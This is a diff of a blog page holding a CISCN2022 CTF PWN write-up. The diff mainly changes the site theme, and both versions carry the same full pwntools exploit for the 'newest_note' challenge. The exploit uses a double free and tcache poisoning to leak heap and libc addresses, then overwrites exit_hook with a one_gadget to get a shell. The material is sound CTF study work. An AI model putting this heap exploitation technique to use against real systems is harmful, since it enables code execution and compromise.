-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Python">add(<span class="hljs-number">11</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x41</span>)+p64(key^(exit_hook-<span class="hljs-number">0x8</span>)))<br>add(<span class="hljs-number">12</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">13</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span>+p64(one_gadget))<br></code></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">11</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x41</span>)+p64(key^(exit_hook-<span class="number">0x8</span>)))</span><br><span class="line">add(<span class="number">12</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">13</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+p64(one_gadget))</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://img-blog.csdnimg.cn/6d12cf8cb53c453683ef5ee3ddc6f2d2.png" alt="img"></p>
-<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&#x27;./newest_note&#x27;</span>)<br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx,text</span>):<br>    io.recvuntil(<span class="hljs-string">&#x27;4. Exit&#x27;</span>)<br>    io.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(idx))<br>    io.recvuntil(<span class="hljs-string">&#x27;Content: &#x27;</span>)<br>    io.send(text)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>    io.recvuntil(<span class="hljs-string">&#x27;4. Exit&#x27;</span>)<br>    io.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(idx))<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    io.recvuntil(<span class="hljs-string">&#x27;4. Exit&#x27;</span>)<br>    io.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(idx))<br>    <br>io.recvuntil(<span class="hljs-string">&#x27;How many pages your notebook will be? :&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;16&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>    add(i,<span class="hljs-string">&#x27;aaaaaaaa&#x27;</span>)<br><br>add(<span class="hljs-number">15</span>,<span class="hljs-string">&#x27;cccccccc&#x27;</span>)<br>add(<span class="hljs-number">15</span>,<span class="hljs-string">&#x27;cccccccc&#x27;</span>)<br>add(<span class="hljs-number">15</span>,<span class="hljs-string">&#x27;cccccccc&#x27;</span>)<br><br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Content: &#x27;</span>)<br>key=u64(io.recvuntil(<span class="hljs-string">&#x27;\x0a&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) <span class="hljs-comment">#key</span><br>heap_base = key&lt;&lt;<span class="hljs-number">12</span><br>success(<span class="hljs-string">&#x27;key--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(key))<br>success(<span class="hljs-string">&#x27;heap--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(heap_base))<br><span class="hljs-comment"># pause()</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">7</span>):<br>    free(i)<br><span class="hljs-comment">## double free</span><br>free(<span class="hljs-number">7</span>)<br>pause()<br>add(<span class="hljs-number">10</span>,<span class="hljs-string">&#x27;aaaaaaaa&#x27;</span>)<br>free(<span class="hljs-number">7</span>)<br><span class="hljs-comment"># pause()</span><br><br><span class="hljs-comment">## fake tcache</span><br>add(<span class="hljs-number">10</span>,p64(key^(heap_base+<span class="hljs-number">0x480</span>)))<br>add(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(key^(heap_base+<span class="hljs-number">0x440</span>)))<br>add(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(key^(heap_base+<span class="hljs-number">0x400</span>)))<br>add(<span class="hljs-number">2</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(key^(heap_base+<span class="hljs-number">0x3a0</span>)))<br>add(<span class="hljs-number">3</span>,p64(key^(heap_base+<span class="hljs-number">0x380</span>)))<br>add(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(key^(heap_base+<span class="hljs-number">0x340</span>)))<br>add(<span class="hljs-number">5</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(key)) <span class="hljs-comment">##7</span><br>add(<span class="hljs-number">7</span>,<span class="hljs-string">&#x27;aaaaaaaa&#x27;</span>)<br><br><span class="hljs-comment">## change head of 4 </span><br>add(<span class="hljs-number">7</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x441</span>))<br><br>free(<span class="hljs-number">4</span>) <br>show(<span class="hljs-number">4</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Content: &#x27;</span>)<br>libc_base = u64(io.recvuntil(<span class="hljs-string">&#x27;\x0a&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x218cc0</span><br>success(<span class="hljs-string">&#x27;libc_base--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br><br>exit_hook = libc_base + <span class="hljs-number">0x21a6c8</span><br>one_gadget = libc_base + <span class="hljs-number">0xeeccc</span><br>success(<span class="hljs-string">&#x27;exit_hook--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(exit_hook))<br><br>add(<span class="hljs-number">11</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x41</span>)+p64(key^(exit_hook-<span class="hljs-number">0x8</span>)))<br>add(<span class="hljs-number">12</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">13</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span>+p64(one_gadget))<br><br>io.recvuntil(<span class="hljs-string">&#x27;4. Exit&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br><br><br>io.interactive()<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0xeeccc execve(&quot;/bin/sh&quot;, r15, r12)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [r15] == NULL || r15 == NULL</span><br><span class="hljs-string">  [r12] == NULL || r12 == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xeeccf execve(&quot;/bin/sh&quot;, r15, rdx)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [r15] == NULL || r15 == NULL</span><br><span class="hljs-string">  [rdx] == NULL || rdx == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xeecd2 execve(&quot;/bin/sh&quot;, rsi, rdx)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsi] == NULL || rsi == NULL</span><br><span class="hljs-string">  [rdx] == NULL || rdx == NULL&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>
-                
-              </div>
-            
-            <hr/>
-            <div>
-              <div class="post-metas my-3">
-  
-  
-</div>
-
-
-              
-  
-
-  <div class="license-box my-3">
-    <div class="license-title">
-      <div>【CISCN2022】初赛PWN部分writeup</div>
-      <div>http://loora1n.github.io/2022/06/04/ciscn2022/</div>
-    </div>
-    <div class="license-meta">
-      
-        <div class="license-meta-item">
-          <div>作者</div>
-          <div>Loora1N</div>
-        </div>
-      
-      
-        <div class="license-meta-item license-meta-date">
-          <div>发布于</div>
-          <div>2022年6月4日</div>
-        </div>
-      
-      
-      
-        <div class="license-meta-item">
-          <div>许可协议</div>
-          <div>
-            
-              
-              
-                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
-                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
-                    <i class="iconfont icon-by"></i>
-                  </span>
-                </a>
-              
-            
-          </div>
-        </div>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./newest_note&#x27;</span>)</span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,text</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;4. Exit&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">    io.send(text)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;4. Exit&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;4. Exit&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line">io.recvuntil(<span class="string">&#x27;How many pages your notebook will be? :&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;16&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    add(i,<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">15</span>,<span class="string">&#x27;cccccccc&#x27;</span>)</span><br><span class="line">add(<span class="number">15</span>,<span class="string">&#x27;cccccccc&#x27;</span>)</span><br><span class="line">add(<span class="number">15</span>,<span class="string">&#x27;cccccccc&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">key=u64(io.recvuntil(<span class="string">&#x27;\x0a&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) <span class="comment">#key</span></span><br><span class="line">heap_base = key&lt;&lt;<span class="number">12</span></span><br><span class="line">success(<span class="string">&#x27;key--&gt;&#x27;</span>+<span class="built_in">hex</span>(key))</span><br><span class="line">success(<span class="string">&#x27;heap--&gt;&#x27;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line"><span class="comment">## double free</span></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">pause()</span><br><span class="line">add(<span class="number">10</span>,<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## fake tcache</span></span><br><span class="line">add(<span class="number">10</span>,p64(key^(heap_base+<span class="number">0x480</span>)))</span><br><span class="line">add(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(key^(heap_base+<span class="number">0x440</span>)))</span><br><span class="line">add(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(key^(heap_base+<span class="number">0x400</span>)))</span><br><span class="line">add(<span class="number">2</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(key^(heap_base+<span class="number">0x3a0</span>)))</span><br><span class="line">add(<span class="number">3</span>,p64(key^(heap_base+<span class="number">0x380</span>)))</span><br><span class="line">add(<span class="number">4</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(key^(heap_base+<span class="number">0x340</span>)))</span><br><span class="line">add(<span class="number">5</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(key)) <span class="comment">##7</span></span><br><span class="line">add(<span class="number">7</span>,<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## change head of 4 </span></span><br><span class="line">add(<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x441</span>))</span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>) </span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">&#x27;\x0a&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x218cc0</span></span><br><span class="line">success(<span class="string">&#x27;libc_base--&gt;&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">exit_hook = libc_base + <span class="number">0x21a6c8</span></span><br><span class="line">one_gadget = libc_base + <span class="number">0xeeccc</span></span><br><span class="line">success(<span class="string">&#x27;exit_hook--&gt;&#x27;</span>+<span class="built_in">hex</span>(exit_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">11</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x41</span>)+p64(key^(exit_hook-<span class="number">0x8</span>)))</span><br><span class="line">add(<span class="number">12</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">13</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+p64(one_gadget))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;4. Exit&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0xeeccc execve(&quot;/bin/sh&quot;, r15, r12)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [r12] == NULL || r12 == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xeeccf execve(&quot;/bin/sh&quot;, r15, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xeecd2 execve(&quot;/bin/sh&quot;, rsi, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsi] == NULL || rsi == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
       
     </div>
-    <div class="license-icon iconfont"></div>
+
   </div>
 
+  <div class="article-footer">
+    <div class="article-meta pull-left">
 
-
-              
-                <div class="post-prevnext my-3">
-                  <article class="post-prev col-6">
-                    
-                    
-                      <a href="/2022/06/05/QEMU%20&amp;%20arm%20%E7%AE%80%E6%98%93pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" title="QEMU &amp; arm 简易pwn环境搭建">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">QEMU &amp; arm 简易pwn环境搭建</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
-                  </article>
-                  <article class="post-next col-6">
-                    
-                    
-                      <a href="/2022/06/03/HEAP%20%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E8%AE%B0%E5%BD%95%E4%BB%A5%E5%8F%8A%E6%80%BB%E7%BB%93/" title="HEAP 攻击方式记录以及总结">
-                        <span class="hidden-mobile">HEAP 攻击方式记录以及总结</span>
-                        <span class="visible-mobile">下一篇</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
-                    
-                  </article>
-                </div>
-              
-            </div>
-
-            
-  <article id="comments">
     
-  <script type="text/javascript">
-    Fluid.utils.loadComments('#comments', function() {
-      var light = 'github-light';
-      var dark = 'github-dark';
-      var schema = document.documentElement.getAttribute('data-user-color-scheme');
-      if (schema === 'dark') {
-        schema = dark;
-      } else {
-        schema = light;
-      }
-      window.UtterancesThemeLight = light;
-      window.UtterancesThemeDark = dark;
-      var s = document.createElement('script');
-      s.setAttribute('src', 'https://utteranc.es/client.js');
-      s.setAttribute('repo', 'loora1n/comment');
-      s.setAttribute('issue-term', 'pathname');
-      
-      s.setAttribute('label', 'utterances');
-      
-      s.setAttribute('theme', schema);
-      s.setAttribute('crossorigin', 'anonymous');
-      document.getElementById('comments').appendChild(s);
-    })
-  </script>
-  <noscript>Please enable JavaScript to view the comments</noscript>
 
-
-  </article>
-
-
-          </article>
-        </div>
-      </div>
-    </div>
-
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
-  <aside class="sidebar" style="margin-left: -1rem">
-    <div id="toc">
-  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
-  <div class="toc-body" id="toc-body"></div>
-</div>
-
-
-
-  </aside>
-
+    
 
     </div>
+
+    
+  </div>
+</article>
+
+  
+
+
+
+
+
+
+
+
+
+    </main>
+
+    <footer class="site-footer">
+  <p class="site-info">
+    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
+    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
+    </br>
+    
+    &copy; 2023 Loora1N
+    
+  </p>
+</footer>
+    
+    
   </div>
 </div>
-
-
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-
-
-
-
-    
-
-    
-      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
-        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
-      </a>
-    
-
-    
-      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
-     aria-hidden="true">
-  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
-    <div class="modal-content">
-      <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
-      </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
-        </div>
-        <div class="list-group" id="local-search-result"></div>
-      </div>
-    </div>
-  </div>
-</div>
-
-    
-
-    
-  </main>
-
-  <footer>
-    <div class="footer-inner">
-  
-    <div class="footer-content">
-       <a href="https://github.com/Loora1N" target="_blank" rel="nofollow noopener"><span>Loora1N</span></a> <i class="iconfont icon-love"></i> <a href="https://space.bilibili.com/33242548?spm_id_from=333.1007.0.0" target="_blank" rel="nofollow noopener"><span>鷺雨君</span></a>
-    </div>
-  
-  
-    <div class="statistics">
-  
-  
-
-  
-    
-      <span id="leancloud-site-pv-container" style="display: none">
-        总访问量 
-        <span id="leancloud-site-pv"></span>
-         次
-      </span>
-    
-    
-      <span id="leancloud-site-uv-container" style="display: none">
-        总访客数 
-        <span id="leancloud-site-uv"></span>
-         人
-      </span>
-    
-    
-
-  
-</div>
-
-  
-  
-  
-  <span id="timeDate">载入天数...</span>
-  <span id="times">载入时分秒...</span>
-  <script>
-  var now = new Date();
-  function createtime(){
-      var grt= new Date("06/03/2022 00:00:00");//此处修改你的建站时间或者网站上线时间
-      now.setTime(now.getTime()+250);
-      days = (now - grt ) / 1000 / 60 / 60 / 24;
-      dnum = Math.floor(days);
-      hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);
-      hnum = Math.floor(hours);
-      if(String(hnum).length ==1 ){
-          hnum = "0" + hnum;
-      }
-      minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
-      mnum = Math.floor(minutes);
-      if(String(mnum).length ==1 ){
-                mnum = "0" + mnum;
-      }
-      seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
-      snum = Math.round(seconds);
-      if(String(snum).length ==1 ){
-                snum = "0" + snum;
-      }
-      document.getElementById("timeDate").innerHTML = "🚀running🚀 for&nbsp"+dnum+"&nbspdays";  //此次自定义显示内容
-      document.getElementById("times").innerHTML = hnum + "&nbsphr&nbsp" + mnum + "&nbspmin&nbsp" + snum + "&nbspsec";
-  }  //此次自定义显示内容
-  setInterval("createtime()",250);
-  </script>   
-</div>
-
-  </footer>
-
-  <!-- Scripts -->
-  
-  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
-  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
-
-  <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
-    NProgress.start()
-    window.addEventListener('load', function() {
-      NProgress.done();
-    })
-  </script>
-
-
-<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
-<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
-<script  src="/js/events.js" ></script>
-<script  src="/js/plugins.js" ></script>
-
-
-  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
-  <script>
-    (function (window, document) {
-      var typing = Fluid.plugins.typing;
-      var subtitle = document.getElementById('subtitle');
-      if (!subtitle || !typing) {
-        return;
-      }
-      var text = subtitle.getAttribute('data-typed-text');
-      
-        typing(text);
-      
-    })(window, document);
-  </script>
-
-
-
-
-
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
-    var toc = jQuery('#toc');
-    if (toc.length === 0 || !window.tocbot) { return; }
-    var boardCtn = jQuery('#board-ctn');
-    var boardTop = boardCtn.offset().top;
-
-    window.tocbot.init(Object.assign({
-      tocSelector     : '#toc-body',
-      contentSelector : '.markdown-body',
-      linkClass       : 'tocbot-link',
-      activeLinkClass : 'tocbot-active-link',
-      listClass       : 'tocbot-list',
-      isCollapsedClass: 'tocbot-is-collapsed',
-      collapsibleClass: 'tocbot-is-collapsible',
-      scrollSmooth    : true,
-      includeTitleTags: true,
-      headingsOffset  : -boardTop,
-    }, CONFIG.toc));
-    if (toc.find('.toc-list-item').length > 0) {
-      toc.css('visibility', 'visible');
-    }
-
-    Fluid.events.registerRefreshCallback(function() {
-      if ('tocbot' in window) {
